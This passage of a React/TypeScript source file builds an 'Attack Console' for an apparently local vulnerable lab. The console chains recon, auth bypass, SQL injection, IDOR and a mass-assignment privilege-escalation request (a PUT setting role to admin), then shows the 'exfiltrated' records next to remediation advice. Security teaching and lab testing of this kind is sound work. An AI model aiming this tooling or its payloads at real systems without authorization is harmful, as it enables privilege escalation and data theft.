          securityFlow: [
            {
              step: 1,
              title: 'Cryptographic Endpoint Audit',
              description: `Queried ${endpoint} to discover active cryptographic ciphers and keys.`,
              technique: 'Cryptographic Inventory Discovery',
            },
            {
              step: 2,
              title: 'Key Material Interception',
              description: 'Extracted public keys, RSA modulus parameters, and cipher configurations.',
              technique: 'CBOM Information Exposure',
            },
            {
              step: 3,
              title: 'Quantum Vulnerability Mapping',
              description: "Flagged RSA-2048 & ECDSA keys as vulnerable to Shor's algorithm (HNDL threat).",
              technique: 'Quantum Threat Modeling',
            },
          ],
          exposedInfoSummary: [
            'Asymmetric cryptographic keys (RSA-2048, ECDSA-256) vulnerable to polynomial-time factoring via Shor’s Algorithm',
            'Full public key certificates and cipher parameters',
            'Harvest-Now-Decrypt-Later (HNDL) exposure for intercepted encrypted traffic',
          ],
          remediationTechniques: [
            {
              title: 'Migrate to NIST Post-Quantum Cryptography (PQC) Standards',
              technique: 'Post-Quantum Algorithm Modernization (NIST FIPS 203/204/205)',
              recommendation: 'Replace legacy RSA and ECC key exchanges with ML-KEM-768 (Kyber) and digital signatures with ML-DSA-65 (Dilithium) or SLH-DSA (SPHINCS+).',
            },
            {
              title: 'Double Symmetric Key Sizes for Grover Resistance',
              technique: 'Quantum Symmetric Hardening',
              recommendation: 'Upgrade AES-128 to AES-256 to maintain 128-bit post-quantum security margin under Grover’s algorithm quadratic speedup.',
            },
          ],
          payload: `GET /api/crypto/config HTTP/1.1\n${authResult ? 'Authorization: Bearer <token>' : ''}`,
          records: keys,
          sample: `${keys.length} cryptographic keys mapped (RSA/ECDSA PQC Risk)`,
          timestamp: new Date().toLocaleTimeString(),
        })
      }
    } catch (e: any) {
      addLog(mkLog('CRYPTO', 'info', `   /api/crypto/config returned ${e?.response?.status ?? 'network error'}`))
    }

    if (authResult) {
      await sleep(300)
      addLog(mkLog('CRYPTO', 'info', '⚡  Testing Mass Assignment on /api/users/me (PUT)...'))
      try {
        const endpoint = `${base}/api/users/me`
        const r = await axios.put(
          endpoint,
          { role: 'admin', balance: 99999 },
          { headers, signal, timeout: 4000 }
        )
        const u = r.data
        if (u && (u.role === 'admin' || u.balance === 99999)) {
          addLog(mkLog('CRYPTO', 'critical',
            `💀  MASS ASSIGNMENT! Self-escalated to role=${u.role} balance=$${u.balance}`))

          upsertStolen({
            id: 'priv-esc',
            type: 'Privilege Escalation via Mass Assignment',
            icon: Key,
            color: 'text-yellow-300',
            count: 1,
            endpoint,
            method: 'PUT',
            technique: 'Mass Assignment / Object Property Tampering',
            cwe: 'CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes',
            securityFlow: [
              {
                step: 1,
                title: 'Mass Assignment Payload Crafting',
                description: 'Crafted JSON request updating `role: "admin"` and `balance: 99999` on `/api/users/me`.',
                technique: 'Attribute Injection',
              },
              {
                step: 2,
                title: 'Unfiltered Entity Binding',
                description: 'Backend ORM bound privileged model fields directly without DTO allow-listing.',
                technique: 'Missing Property Filter',
              },
              {
                step: 3,
                title: 'Administrator Escalation',
                description: 'Standard user entity elevated to full Administrator with arbitrary wallet balance.',
                technique: 'Privilege Escalation Complete',
              },
            ],
            exposedInfoSummary: [
              'Arbitrary self-elevation to highest system permission level (`role: "admin"`)',
              'Direct tampering with sensitive financial wallet balances (`balance: 99999`)',
            ],
            remediationTechniques: [
              {
                title: 'Input DTO Whitelisting & Strict Schema Validation',
                technique: 'Mass Assignment Defense (CWE-915)',
                recommendation: 'Explicitly define which fields users are permitted to edit (e.g. `bio`, `avatar`). Never bind request dictionaries directly into ORM entities.',
                codeSnippet: '# Whitelist allowed editable fields only\nALLOWED_FIELDS = {"full_name", "email"}\nfor key in request.json:\n    if key in ALLOWED_FIELDS:\n        setattr(user, key, request.json[key])\n# role and balance are NEVER modifiable via public PUT',
              },
            ],
            payload: JSON.stringify({ role: 'admin', balance: 99999 }, null, 2),
            records: [u],
            sample: `Escalated to role=${u.role}, balance=$${u.balance}`,
            timestamp: new Date().toLocaleTimeString(),
          })
        } else {
          addLog(mkLog('CRYPTO', 'success', '   Mass assignment blocked (fields not updated)'))
        }
      } catch (e: any) {
        addLog(mkLog('CRYPTO', 'info', `   Mass assignment attempt: ${e?.response?.status ?? 'network error'}`))
      }
    }

    setProgress(88)
  }

  // ── PHASE 6: Summary ─────────────────────────────────────────────────────────
  async function phaseDataExfil() {
    setPhase('DATA_EXFIL')
    addLog(mkLog('DATA_EXFIL', 'info', '📤  Aggregating exfiltrated data...'))
    await sleep(500)
    addLog(mkLog('DATA_EXFIL', 'critical', '🏴  ATTACK COMPLETE — Data exfiltration summary compiled above.'))
    setProgress(100)
    setPhase('COMPLETE')
    setDone(true)
  }

  // ── Master orchestrator ──────────────────────────────────────────────────────
  const launchAttack = async () => {
    if (running) return
    let base = targetUrl.trim().replace(/\/$/, '')
    if (!base) base = 'http://localhost:8080'
    if (!base.startsWith('http://') && !base.startsWith('https://')) {
      base = 'http://' + base
    }

    setRunning(true)
    setDone(false)
    setLogs([])
    setStolen([])
    setProgress(0)
    setPhase('RECON')

    const ctrl = new AbortController()
    abortRef.current = ctrl
    const { signal } = ctrl

    try {
      addLog(mkLog('RECON', 'info', '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'))
      addLog(mkLog('RECON', 'warning', `⚠️   TARGET AUDIT: ${base}`))
      addLog(mkLog('RECON', 'info', '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'))

      const isLocalLab = base.includes('localhost:8080') || base.includes('127.0.0.1:8080') || base.includes('vulnerable-app')
      if (!isLocalLab) {
        addLog(mkLog('RECON', 'warning', `ℹ️  External Domain Notice: "${base}" is not the local lab target.`))
        addLog(mkLog('RECON', 'info', '   The Attack Console tests specific lab testbed endpoints (/api/info, /api/auth/login, etc.).'))
        addLog(mkLog('RECON', 'info', '   External servers do not expose these lab endpoints and will return 404 / CORS blocks.'))
      }

      await sleep(250)

      await phaseRecon(base, signal)
      const authResult = await phaseAuthBypass(base, signal)
      await phaseSQLi(base, signal)
      await phaseIDOR(base, authResult, signal)
      await phaseCrypto(base, authResult, signal)
      await phaseDataExfil()
    } catch (err: any) {
      if (axios.isCancel(err) || err?.name === 'CanceledError' || err?.name === 'AbortError') {
        addLog(mkLog(phase, 'warning', '🛑  Attack aborted by user'))
      } else {
        addLog(mkLog(phase, 'error', `Fatal error: ${err?.message}`))
      }
    } finally {
      setRunning(false)
    }
  }

  const abort = () => {
    abortRef.current?.abort()
    setRunning(false)
  }

  const reset = () => {
    abort()
    setLogs([])
    setStolen([])
    setProgress(0)
    setPhase('IDLE')
    setDone(false)
    setSelectedRecord(null)
  }

  const totalExfiltratedCount = stolen.reduce((a, s) => a + s.count, 0)

  // ─── Render ────────────────────────────────────────────────────────────────
  return (
    <div className="p-6 space-y-5 min-h-screen relative">
      {/* Header */}
      <div className="flex items-center justify-between">
        <div className="flex items-center gap-3">
          <div className="w-10 h-10 rounded-xl bg-red-500/20 border border-red-500/40 flex items-center justify-center">
            <ShieldOff size={22} className="text-red-400" />
          </div>
          <div>
            <h1 className="text-2xl font-bold text-white flex items-center gap-2">
              Attack Console
              {running && (
                <span className="inline-flex items-center gap-1.5 text-xs px-2.5 py-0.5 rounded-full bg-red-500/20 text-red-400 border border-red-500/30 animate-pulse">
                  <span className="w-1.5 h-1.5 rounded-full bg-red-400" /> LIVE EXPLOITATION
                </span>
              )}
            </h1>
            <p className="text-xs text-gray-400">Automated multi-phase penetration attack & exfiltration telemetry</p>
          </div>
        </div>
        <button onClick={reset} className="qs-btn-secondary text-xs gap-1.5">
          <RefreshCw size={13} /> Reset
        </button>
      </div>

      {/* Warning */}
      <div className="qs-card border-yellow-500/30 bg-yellow-500/5 py-3">
        <div className="flex items-start gap-2.5">
          <AlertTriangle size={16} className="text-yellow-400 flex-shrink-0 mt-0.5" />
          <p className="text-xs text-yellow-200/80">
            <strong className="text-yellow-300">Authorized targets only.</strong>{' '}
            This console executes real HTTP penetration exploits against the configured URL.
            Ensure you target your local <code className="bg-black/40 px-1.5 py-0.5 rounded text-yellow-300 font-mono">http://localhost:8080</code> vulnerable security lab.
          </p>
        </div>
      </div>

      {/* Target + Launch */}
      <div className="qs-card border-red-500/20">
        <div className="flex items-end gap-3">
          <div className="flex-1">
            <div className="flex items-center justify-between mb-1.5">
              <label className="block text-xs text-gray-400 font-mono">TARGET LAB URL</label>
              <button
                type="button"
                onClick={() => setTargetUrl('http://localhost:8080')}
                className="text-[11px] text-cyan-400 hover:text-cyan-300 font-mono underline"
              >
                Use Local Lab Target (http://localhost:8080)
              </button>
            </div>
            <input
              id="attack-target-url"
              type="text"
              className="qs-input font-mono text-sm w-full"
              placeholder="http://localhost:8080"
              value={targetUrl}
              disabled={running}
              onChange={e => setTargetUrl(e.target.value)}
              onKeyDown={e => e.key === 'Enter' && !running && launchAttack()}
            />
          </div>
          {!running ? (
            <button
              id="launch-attack-btn"
              onClick={launchAttack}
              className="flex items-center gap-2 px-5 py-2.5 rounded-lg bg-red-600 hover:bg-red-500 text-white font-semibold text-sm transition-all duration-200 shadow-lg shadow-red-900/30"
            >
              <Zap size={16} /> LAUNCH ATTACK
            </button>
          ) : (
            <button
              onClick={abort}
              className="flex items-center gap-2 px-5 py-2.5 rounded-lg bg-gray-700 hover:bg-gray-600 text-white font-semibold text-sm transition-all"
            >
              <XCircle size={16} /> ABORT
            </button>
          )}
        </div>

        {(running || done) && (
          <div className="mt-4">
            <div className="flex items-center justify-between mb-1.5">
              <span className={`text-xs font-mono font-bold ${PHASE_COLOR[phase]}`}>[{phase}]</span>
              <span className="text-xs text-gray-400 font-mono">{Math.round(progress)}%</span>
            </div>
            <div className="h-2 bg-gray-800 rounded-full overflow-hidden">
              <div
                className="h-2 bg-gradient-to-r from-red-500 via-orange-400 to-yellow-400 rounded-full transition-all duration-500"
                style={{ width: `${progress}%` }}
              />
            </div>
          </div>
        )}
      </div>

      {/* Main Grid */}
      <div className="grid grid-cols-1 xl:grid-cols-3 gap-5">
        {/* Terminal (Left 2 cols) */}
        <div className="xl:col-span-2 qs-card p-0 overflow-hidden flex flex-col" style={{ minHeight: 520 }}>
          <div className="flex items-center justify-between px-4 py-2.5 border-b border-gray-800 bg-gray-900/80">
            <div className="flex items-center gap-2">
              <Terminal size={14} className="text-green-400" />
              <span className="text-xs font-mono text-green-400 font-semibold">attack-terminal</span>
              <span className="text-[10px] text-gray-500 bg-black/40 px-2 py-0.5 rounded font-mono">Live Telemetry</span>
            </div>
            <button
              className="text-gray-400 hover:text-white transition-colors text-xs flex items-center gap-1"
              title="Copy terminal logs"
              onClick={() => copyToClipboard(logs.map(l => `[${l.ts}][${l.phase}] ${l.msg}`).join('\n'), 'terminal')}
            >
              {copiedKey === 'terminal' ? <Check size={13} className="text-green-400" /> : <Copy size={13} />}
              <span>{copiedKey === 'terminal' ? 'Copied' : 'Copy Logs'}</span>
            </button>
          </div>

          <div
            className="flex-1 overflow-y-auto bg-[#080b11] p-4 font-mono text-xs leading-6 space-y-1"
            style={{ maxHeight: 520 }}
          >
            {logs.length === 0 ? (
              <div className="text-gray-600 select-none py-10 text-center font-mono">
                <div>┌───────────────────────────────────────────────────────────────┐</div>
                <div>│  Ready to launch attack sequence against local target.        │</div>
                <div>│  Select target URL (e.g. http://localhost:8080) & launch.      │</div>
                <div>└───────────────────────────────────────────────────────────────┘</div>
              </div>
            ) : (
              logs.map(entry => (
                <div key={entry.id} className="flex gap-2">
                  <span className="text-gray-600 flex-shrink-0 w-20">[{entry.ts}]</span>
                  <span className={`flex-shrink-0 w-28 font-semibold ${PHASE_COLOR[entry.phase]}`}>
                    [{entry.phase.slice(0, 10)}]
                  </span>
                  <span className={LEVEL_COLOR[entry.level]}>{entry.msg}</span>
                </div>
              ))
            )}
            {running && (
              <div className="flex gap-2 mt-1">
                <span className="text-gray-600 w-20">[{new Date().toLocaleTimeString()}]</span>
                <span className={`w-28 font-semibold ${PHASE_COLOR[phase]}`}>[{phase.slice(0, 10)}]</span>
                <span className="text-green-400 animate-pulse">▍</span>
              </div>
            )}
            <div ref={logEndRef} />
          </div>
        </div>

        {/* Right Panel: Exfiltrated Data & Attack Phases with Techniques */}
        <div className="flex flex-col gap-4">
          
          {/* Exfiltrated Data Card */}
          <div className="qs-card flex-1 flex flex-col">
            <div className="flex items-center justify-between mb-3">
              <div className="flex items-center gap-2">
                <Database size={16} className="text-pink-400" />
                <h3 className="text-sm font-semibold text-white">Exfiltrated Data</h3>
              </div>
              {stolen.length > 0 && (
                <span className="text-xs font-mono px-2.5 py-0.5 rounded-full bg-pink-500/20 text-pink-300 border border-pink-500/30">
                  {totalExfiltratedCount} records
                </span>
              )}
            </div>

            {stolen.length === 0 ? (
              <div className="text-center py-12 text-gray-500 text-xs flex-1 flex flex-col items-center justify-center">
                <Database size={36} className="mb-2 opacity-20 text-pink-400" />
                <span>No exfiltrated records yet</span>
                <span className="text-[11px] text-gray-600 mt-1">Extracted data will populate live during attack</span>
              </div>
            ) : (
              <div className="space-y-2.5 flex-1 overflow-y-auto max-h-[300px] pr-1">
                {stolen.map(s => {
                  const Icon = s.icon
                  return (
                    <div
                      key={s.id}
                      onClick={() => setSelectedRecord(s)}
                      className="group cursor-pointer p-3 rounded-lg bg-gray-900/80 hover:bg-gray-800/90 border border-gray-800 hover:border-pink-500/40 transition-all duration-200"
                    >
                      <div className="flex items-start gap-3">
                        <div className={`w-8 h-8 rounded-lg flex items-center justify-center bg-black/60 flex-shrink-0 ${s.color}`}>
                          <Icon size={16} />
                        </div>
                        <div className="flex-1 min-w-0">
                          <div className="flex items-center justify-between">
                            <span className="text-xs font-semibold text-white group-hover:text-pink-300 transition-colors">
                              {s.type}
                            </span>
                            <span className="text-xs font-mono font-bold text-red-400 bg-red-950/40 px-1.5 py-0.5 rounded border border-red-900/30">
                              {s.count}
                            </span>
                          </div>
                          
                          {/* Endpoint and method */}
                          <div className="flex items-center gap-1.5 mt-1 text-[11px] text-gray-400 font-mono truncate">
                            <span className="px-1 py-0.2 rounded bg-gray-800 text-[10px] text-blue-400 font-bold">
                              {s.method}
                            </span>
                            <span className="truncate">{s.endpoint}</span>
                          </div>

                          {/* Sample summary */}
                          {s.sample && (
                            <div className="text-xs text-gray-400 truncate mt-1 font-mono">
                              {s.sample}
                            </div>
                          )}

                          {/* Click to inspect flow & remediation */}
                          <div className="flex items-center gap-1 mt-1.5 text-[10px] text-pink-400/80 group-hover:text-pink-300 font-medium">
                            <Eye size={11} /> View full data, flow & fix <ArrowRight size={10} className="group-hover:translate-x-0.5 transition-transform" />
                          </div>
                        </div>
                      </div>
                    </div>
                  )
                })}
              </div>
            )}
          </div>

          {/* Attack Phases & Techniques Implemented */}
          <div className="qs-card">
            <div className="flex items-center justify-between mb-3">
              <h3 className="text-xs font-semibold text-gray-400 uppercase tracking-wider flex items-center gap-1.5">
                <Layers size={13} className="text-cyan-400" /> Attack Phases & Techniques
              </h3>
              <span className="text-[10px] text-gray-500 font-mono">MITRE / OWASP</span>
            </div>

            <div className="space-y-3">
              {PHASE_CONFIG.map(({ phase: p, label, techniques }) => {
                const currentIdx = PHASE_ORDER.indexOf(phase)
                const thisIdx = PHASE_ORDER.indexOf(p)
                const isDone = currentIdx > thisIdx
                const isActive = phase === p && running

                return (
                  <div
                    key={p}
                    className={`p-2.5 rounded-lg border transition-all duration-200 ${
                      isActive
                        ? 'bg-blue-950/20 border-blue-500/40 shadow-sm shadow-blue-500/10'
                        : isDone
                        ? 'bg-gray-900/40 border-gray-800/80'
                        : 'bg-gray-950/30 border-gray-900'
                    }`}
                  >
                    {/* Phase Header */}
                    <div className="flex items-center justify-between mb-1.5">
                      <div className="flex items-center gap-2">
                        {isDone ? (
                          <CheckCircle2 size={15} className="text-green-400 flex-shrink-0" />
                        ) : isActive ? (
                          <div className="w-3.5 h-3.5 rounded-full border-2 border-orange-400 border-t-transparent animate-spin flex-shrink-0" />
                        ) : (
                          <div className="w-3.5 h-3.5 rounded-full border border-gray-700 flex-shrink-0" />
                        )}
                        <span className={`text-xs font-semibold ${isDone ? 'text-green-400' : isActive ? PHASE_COLOR[p] : 'text-gray-400'}`}>
                          {label}
                        </span>
                      </div>
                      <span className="text-[10px] font-mono text-gray-500">
                        {isDone ? 'EXPLOITED' : isActive ? 'EXECUTING' : 'PENDING'}
                      </span>
                    </div>

                    {/* Implemented Techniques Adjacent to Phase */}
                    <div className="ml-5 flex flex-wrap gap-1.5 mt-1">
                      {techniques.map(tech => (
                        <div
                          key={tech.name}
                          className={`inline-flex items-center gap-1 text-[10px] px-2 py-0.5 rounded-md border font-mono transition-colors ${
                            isActive
                              ? 'bg-orange-500/10 border-orange-500/30 text-orange-300'
                              : isDone
                              ? 'bg-green-500/10 border-green-500/20 text-green-300'
                              : 'bg-gray-800/60 border-gray-800 text-gray-500'
                          }`}
                          title={`${tech.cwe}: ${tech.desc}`}
                        >
                          <span className="text-[9px] opacity-75 font-bold">[{tech.cwe}]</span>
                          <span>{tech.name}</span>
                        </div>
                      ))}
                    </div>
                  </div>
                )
              })}
            </div>
          </div>

        </div>
      </div>

      {/* Done banner */}
      {done && (
        <div className="qs-card border-green-500/30 bg-green-500/5 flex items-center justify-between py-4">
          <div className="flex items-center gap-3">
            <CheckCircle2 size={22} className="text-green-400 flex-shrink-0" />
            <div>
              <div className="font-semibold text-green-300 text-sm">Autonomous Exploitation Sequence Complete</div>
              <div className="text-xs text-gray-400 mt-0.5">
                Exfiltrated <strong>{totalExfiltratedCount} records</strong> across <strong>{stolen.length} categories</strong>. Click any record card above to inspect extracted payloads, security flows, and defensive hardening fixes.
              </div>
            </div>
          </div>
          <button
            onClick={() => stolen.length > 0 && setSelectedRecord(stolen[0])}
            className="qs-btn-secondary text-xs flex items-center gap-1.5 text-pink-300 border-pink-500/30"
          >
            <Eye size={14} /> Review All Results
          </button>
        </div>
      )}

      {/* ─── MODAL / FULL DATA, SECURITY FLOW & HARDENING INSPECTOR ──────────── */}
      {selectedRecord && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/80 backdrop-blur-sm animate-in fade-in duration-200">
          <div className="bg-[#0f1422] border border-gray-700 rounded-2xl w-full max-w-4xl max-h-[92vh] flex flex-col shadow-2xl overflow-hidden">
            
            {/* Modal Header */}
            <div className="flex items-center justify-between px-6 py-4 border-b border-gray-800 bg-gray-900/80">
              <div className="flex items-center gap-3">
                <div className={`w-9 h-9 rounded-xl flex items-center justify-center bg-black/60 ${selectedRecord.color}`}>
                  <selectedRecord.icon size={18} />
                </div>
                <div>
                  <h2 className="text-lg font-bold text-white flex items-center gap-2">
                    {selectedRecord.type}
                    <span className="text-xs font-mono px-2 py-0.5 rounded-full bg-pink-500/20 text-pink-300 border border-pink-500/30">
                      {selectedRecord.count} records exfiltrated
                    </span>
                  </h2>
                  <p className="text-xs text-gray-400 font-mono flex items-center gap-2">
                    <span>{selectedRecord.cwe}</span> · <span>Captured at {selectedRecord.timestamp}</span>
                  </p>
                </div>
              </div>
              <button
                onClick={() => setSelectedRecord(null)}
                className="w-8 h-8 rounded-lg bg-gray-800 hover:bg-gray-700 text-gray-400 hover:text-white flex items-center justify-center transition-colors"
              >
                <XCircle size={18} />
              </button>
            </div>

            {/* Modal Body */}
            <div className="flex-1 overflow-y-auto p-6 space-y-6">
              
              {/* 1. Target URL & Technique Bar */}
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div className="bg-gray-900/80 p-3.5 rounded-xl border border-gray-800 space-y-1">
                  <div className="text-[11px] font-mono text-gray-400 uppercase tracking-wider">Target Endpoint & Method</div>
                  <div className="flex items-center justify-between gap-2 mt-1">
                    <div className="flex items-center gap-2 font-mono text-xs text-white truncate">
                      <span className="px-2 py-0.5 rounded bg-blue-500/20 text-blue-400 font-bold border border-blue-500/30">
                        {selectedRecord.method}
                      </span>
                      <span className="truncate text-cyan-300">{selectedRecord.endpoint}</span>
                    </div>
                    <button
                      onClick={() => copyToClipboard(selectedRecord.endpoint, 'endpoint')}
                      className="text-gray-400 hover:text-white p-1 rounded hover:bg-gray-800"
                      title="Copy URL"
                    >
                      {copiedKey === 'endpoint' ? <Check size={14} className="text-green-400" /> : <Copy size={14} />}
                    </button>
                  </div>
                </div>

                <div className="bg-gray-900/80 p-3.5 rounded-xl border border-gray-800 space-y-1">
                  <div className="text-[11px] font-mono text-gray-400 uppercase tracking-wider">Exploited Technique & Vulnerability</div>
                  <div className="text-xs font-semibold text-pink-300 mt-1">
                    {selectedRecord.technique}
                  </div>
                  <div className="text-[11px] text-gray-400 font-mono">
                    {selectedRecord.cwe}
                  </div>
                </div>
              </div>

              {/* 2. What Information Was Exposed (Exposed Info Breakdown) */}
              <div className="space-y-3">
                <div className="flex items-center gap-2">
                  <ShieldAlert size={16} className="text-red-400" />
                  <h3 className="text-sm font-semibold text-white">Exposed Information Breakdown</h3>
                </div>

                <div className="p-3.5 rounded-xl bg-red-950/20 border border-red-500/30 space-y-2">
                  <ul className="space-y-1.5 text-xs text-red-200">
                    {selectedRecord.exposedInfoSummary.map((info, idx) => (
                      <li key={idx} className="flex items-start gap-2">
                        <span className="text-red-400 font-bold">•</span>
                        <span>{info}</span>
                      </li>
                    ))}
                  </ul>
                </div>
              </div>

              {/* 3. Security Hardening & Remediation Techniques (How to Fix) */}
              <div className="space-y-3">
                <div className="flex items-center gap-2">
                  <ShieldCheck size={16} className="text-green-400" />
                  <h3 className="text-sm font-semibold text-white">Techniques to Secure & Protect This URL</h3>
                </div>

                <div className="space-y-3">
                  {selectedRecord.remediationTechniques.map((rem, idx) => (
                    <div key={idx} className="p-3.5 rounded-xl bg-green-950/20 border border-green-500/30 space-y-2">
                      <div className="flex items-center justify-between">
                        <span className="text-xs font-bold text-green-300">{rem.title}</span>
                        <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-green-900/40 text-green-300 border border-green-800">
                          {rem.technique}
                        </span>
                      </div>
                      <p className="text-xs text-gray-300 leading-relaxed">{rem.recommendation}</p>
                      {rem.codeSnippet && (
                        <pre className="p-2.5 bg-[#080b11] border border-gray-800 rounded-lg font-mono text-[11px] text-cyan-300 overflow-x-auto whitespace-pre-wrap mt-2">
                          {rem.codeSnippet}
                        </pre>
                      )}
                    </div>
                  ))}
                </div>
              </div>

              {/* 4. Step-by-Step Security Execution Flow */}
              <div className="space-y-3">
                <div className="flex items-center gap-2">
                  <Layers size={16} className="text-yellow-400" />
                  <h3 className="text-sm font-semibold text-white">Security Attack Flow & Exploitation Sequence</h3>
                </div>

                <div className="space-y-2.5">
                  {selectedRecord.securityFlow.map(f => (
                    <div key={f.step} className="flex items-start gap-3 p-3 rounded-xl bg-gray-900/50 border border-gray-800/80">
                      <div className="w-6 h-6 rounded-full bg-red-500/20 border border-red-500/40 text-red-400 font-bold font-mono text-xs flex items-center justify-center flex-shrink-0 mt-0.5">
                        {f.step}
                      </div>
                      <div className="flex-1 min-w-0">
                        <div className="flex items-center justify-between">
                          <span className="text-xs font-bold text-white">{f.title}</span>
                          <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-gray-800 text-gray-400 border border-gray-700">
                            {f.technique}
                          </span>
                        </div>
                        <p className="text-xs text-gray-400 mt-1 leading-relaxed">{f.description}</p>
                      </div>
                    </div>
                  ))}
                </div>
              </div>

              {/* 5. Injected Payload / Parameters */}
              {selectedRecord.payload && (
                <div className="space-y-2">
                  <div className="flex items-center justify-between">
                    <div className="flex items-center gap-2">
                      <Code size={15} className="text-cyan-400" />
                      <h3 className="text-sm font-semibold text-white">Injected Exploit Payload / Request Body</h3>
                    </div>
                    <button
                      onClick={() => copyToClipboard(selectedRecord.payload!, 'payload')}
                      className="text-xs font-mono text-gray-400 hover:text-white flex items-center gap-1"
                    >
                      {copiedKey === 'payload' ? <Check size={13} className="text-green-400" /> : <Copy size={13} />}
                      <span>{copiedKey === 'payload' ? 'Copied' : 'Copy Payload'}</span>
                    </button>
                  </div>
                  <pre className="p-3 bg-[#080b11] border border-gray-800 rounded-xl font-mono text-xs text-cyan-300 overflow-x-auto whitespace-pre-wrap">
                    {selectedRecord.payload}
                  </pre>
                </div>
              )}

              {/* 6. Complete Extracted Data (Records View) */}
              <div className="space-y-3">
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-2">
                    <Database size={16} className="text-green-400" />
                    <h3 className="text-sm font-semibold text-white">Complete Extracted Data ({selectedRecord.records.length} items)</h3>
                  </div>
                  <div className="flex items-center gap-2">
                    <button
                      onClick={() => copyToClipboard(JSON.stringify(selectedRecord.records, null, 2), 'rawdata')}
                      className="qs-btn-secondary text-xs flex items-center gap-1.5"
                    >
                      {copiedKey === 'rawdata' ? <Check size={13} className="text-green-400" /> : <Copy size={13} />}
                      <span>{copiedKey === 'rawdata' ? 'Copied' : 'Copy JSON'}</span>
                    </button>
                    <button
                      onClick={() => {
                        const blob = new Blob([JSON.stringify(selectedRecord.records, null, 2)], { type: 'application/json' })
                        const url = URL.createObjectURL(blob)
                        const a = document.createElement('a')
                        a.href = url
                        a.download = `exfiltrated-${selectedRecord.id}-${Date.now()}.json`
                        a.click()
                      }}
                      className="qs-btn-secondary text-xs flex items-center gap-1.5 text-cyan-300"
                    >
                      <FileDown size={13} /> Export JSON
                    </button>
                  </div>
                </div>

                {/* Formatted JSON / Table Viewer */}
                <div className="bg-[#080b11] border border-gray-800 rounded-xl p-4 overflow-hidden">
                  <pre className="font-mono text-xs text-green-400 max-h-80 overflow-y-auto leading-relaxed">
                    {JSON.stringify(selectedRecord.records, null, 2)}
                  </pre>
                </div>
              </div>

            </div>

            {/* Modal Footer */}
            <div className="px-6 py-3 border-t border-gray-800 bg-gray-900/60 flex items-center justify-between text-xs text-gray-500 font-mono">
              <span>Target: {targetUrl}</span>
              <button
                onClick={() => setSelectedRecord(null)}
                className="qs-btn-secondary text-xs"
              >
                Close Inspector
              </button>
            </div>

          </div>
        </div>
      )}

    </div>
  )
}
